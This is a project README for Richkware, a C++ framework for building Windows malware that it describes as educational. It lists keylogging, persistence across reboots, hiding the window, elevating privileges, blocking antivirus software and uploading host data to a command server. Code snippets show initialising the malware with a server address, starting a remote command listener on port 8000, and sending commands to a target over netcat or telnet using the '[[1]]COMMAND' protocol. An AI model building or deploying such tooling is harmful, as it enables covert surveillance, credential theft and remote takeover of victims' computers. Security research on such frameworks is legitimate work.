# Richkware

[![Build status](https://ci.appveyor.com/api/projects/status/1tn6vedeaq0v27ra?svg=true)](https://ci.appveyor.com/project/richkmeli/richkware)
[![Codacy Badge](https://api.codacy.com/project/badge/Grade/e6b4a003d5e7404c80225391bfe34f45)](https://app.codacy.com/app/richkmeli/Richkware?utm_source=github.com&utm_medium=referral&utm_content=richkmeli/Richkware&utm_campaign=Badge_Grade_Dashboard)

**Richkware** is a C++ framework designed for building Windows malware for educational and research purposes. It provides a comprehensive library of network and system functions to create various types of malware, including viruses, worms, bots, spyware, keyloggers, and scareware.

## Description

The Richkware framework offers a modular set of functions enabling the creation of malware with diverse capabilities, such as network communication, system manipulation, and cryptography.

### Supported Malware Types:
- Virus
- Worm
- Bot
- Spyware
- Keylogger
- Scareware

## Related Projects

- **[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)** (RMS): A centralized server for managing hosts infected with Richkware-based malware.
- **[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)** (RMC): A client interface for communicating with the RMS, allowing administrators to send commands to infected hosts.

![Diagram](https://raw.githubusercontent.com/richkmeli/richkmeli.github.io/master/Richkware/Diagram/RichkwareDiagram1.2.png)

## Documentation

|              | EN                          | IT                     |
|--------------|:----------------------------:|:----------------------:|
| Presentation | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/EN/Slide.pdf) | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/IT/Slide.pdf) |
| Report       | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/EN/Report.pdf)  | [PDF](https://github.com/richkmeli/Richkware/blob/master/doc/IT/Relazione.pdf) |

## Functions

### Network

- **Server** (*network.h*): Manages a multi-threaded server to receive commands from the internet (via RMC or console) using a specific protocol.
    - **Protocol** (*protocol.h*):
        1. **Remote command execution** (ID 1)
        2. *(Work in progress)*
- **Network** (*network.h*):
    - **RawRequest**: Sends a raw request to a server.
    - **UploadInfoToRichkwareManagerServer**: Uploads host information to the **Richkware-Manager-Server**.

### System

- **Storage** (*storage.h*):
    - **SaveSession** and **LoadSession**: Save and load the encrypted application state using:
        - **Registry** (`SaveValueReg`, `LoadValueReg`)
        - **File** (`SaveValueToFile`, `LoadValueFromFile`)
    - **Persistence**: Ensures the application persists in the system across reboots.
- **IsAdmin** and **RequestAdminPrivileges** (*richkware.h*): Checks for and requests administrator privileges.
- **StealthWindow** (*richkware.h*): Hides the application window.
- **OpenApp** (*richkware.h*): Opens arbitrary applications.
- **Keylogger** (*richkware.h*): Logs all keystrokes to a file.
- **BlockApps** and **UnBlockApps** (*blockApps.h*): Blocks and unblocks specific applications (e.g., antivirus software).

### Cryptography

- **Encrypt and Decrypt** (*crypto.h*): Supports **RC4** (default) and **Blowfish** algorithms.
- **Encode and Decode** (*crypto.h*): Supports **Base64** (default) and **Hex** encoding.

![Cryptography Diagram](https://raw.githubusercontent.com/richkmeli/richkmeli.github.io/master/Richkware/Diagram/RichkwareCryptographyDiagram1.1.png)

### Utilities

- **RandMouse** (*richkware.h*): Randomly moves the mouse cursor.
- **Hibernation** (*richkware.h*): Hibernates the system.

## Requirements

To build and use **Richkware**, you need:

- **Make** or **CMake**
- **C++17** compliant compiler (e.g., GCC 7+, Clang 5+, MSVC 2017+)
- [MinGW-w64](http://www.mingw.org/) (if cross-compiling for Windows from Linux)

## Getting Started

### Data Initialization

#### With Richkware-Manager-Server (RMS)

If you have deployed **RMS**, initialize the malware as follows:

```cpp
int main() {
    // Richkware richkware(appName, defaultEncryptionKey, serverAddress, serverPort, associatedUser);
    Richkware richkware("Richk", "DefaultPassword", "192.168.99.100", "8080", "associatedUser");
    // ...
    return 0;
}
```

This retrieves a secure key from **RMS** for encryption. **DefaultPassword** is used as a fallback if the RMS is unreachable.

#### Without Richkware-Manager-Server

If you are not using **RMS**, initialize it simply:

```cpp
Richkware richkware("Richk", "richktest");
```

This uses **richktest** as the static encryption key.

## Compilation

### Using Make (Linux/MinGW)

```bash
make
```

### Using Microsoft C++ Compiler (Visual Studio)

1. Go to **C/C++ > Preprocessor > Preprocessor Definitions**, and add `_CRT_SECURE_NO_WARNINGS`.
2. In **Linker > Input > Additional Dependencies**, add `Ws2_32.lib`.

## Example Usage

### Server-side: Starting the Listener

In your main program, call `StartServer` to listen for incoming commands. This example uses TCP port 8000:

```cpp
int main () {
    // ...
    richkware.network.server.Start("8000");
    // ...
}
```

### Client-side: Sending Commands

#### Using Richkware-Manager-Client (RMC)

The easiest way is to use **Richkware-Manager-Client** to manage capabilities and send commands via a GUI.

#### Using Netcat (Unix)

```bash
nc <target_ip> 8000
```

#### Using Telnet (Windows)

```bash
telnet <target_ip> 8000
```

#### Command Protocol

Once connected, you can send commands following the protocol:

```plaintext
[[1]]COMMAND
```
